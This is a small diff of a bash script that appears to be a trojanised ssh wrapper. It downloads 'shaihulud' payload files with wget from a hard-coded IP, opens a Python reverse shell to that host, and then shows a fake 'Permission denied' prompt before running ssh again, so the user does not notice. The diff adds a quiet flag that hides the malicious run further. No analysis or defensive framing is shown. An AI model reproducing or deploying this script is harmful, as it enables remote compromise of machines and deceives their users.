@@ -1,7 +1,7 @@
 #!/bin/bash
 PORT=4444
 IP="10.0.0.1"
-/usr/bin/ssh -T $1 << EOF
+/usr/bin/ssh -q -T $1 << EOF
 
 wget http://$IP:8080/libc.shaihulud.so
 wget http://$IP:8080/shaihulud.sh
@@ -14,5 +14,4 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 EOF
 echo "Permission denied, please try again."
-/usr/bin/ssh -T $1 
-
+/usr/bin/ssh -T $1
